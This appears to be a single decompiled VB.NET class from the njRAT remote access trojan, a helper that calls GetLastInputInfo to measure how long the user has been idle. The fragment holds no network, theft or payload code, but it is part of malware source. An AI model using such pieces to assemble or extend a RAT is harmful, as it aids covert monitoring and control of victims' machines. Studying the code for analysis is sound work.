Imports System
Imports System.Diagnostics
Imports System.Runtime.InteropServices

Namespace NJRAT
	' Token: 0x02000031 RID: 49
	Public NotInheritable Class GClass7
		' Token: 0x060005AF RID: 1455 RVA: 0x0000253A File Offset: 0x0000073A
		<DebuggerNonUserCode()>
		Public Sub New()
		End Sub

		' Token: 0x060005B0 RID: 1456
		Private Declare Function GetLastInputInfo Lib "User32.dll" (ByRef gstruct0_0 As GClass7.GStruct0) As Boolean

		' Token: 0x060005B1 RID: 1457 RVA: 0x00034AF4 File Offset: 0x00032CF4
		Public Shared Function smethod_0() As UInteger
			Dim gstruct As GClass7.GStruct0 = New GClass7.GStruct0() With { .uint_0 = Convert.ToUInt32(Marshal.SizeOf(gstruct)) }
			GClass7.GetLastInputInfo(gstruct)
			Return Convert.ToUInt32(Environment.TickCount) - gstruct.uint_1
		End Function

		' Token: 0x02000032 RID: 50
		Public Structure GStruct0
			' Token: 0x0400031D RID: 797
			Public uint_0 As UInteger

			' Token: 0x0400031E RID: 798
			Public uint_1 As UInteger
		End Structure
	End Class
End Namespace
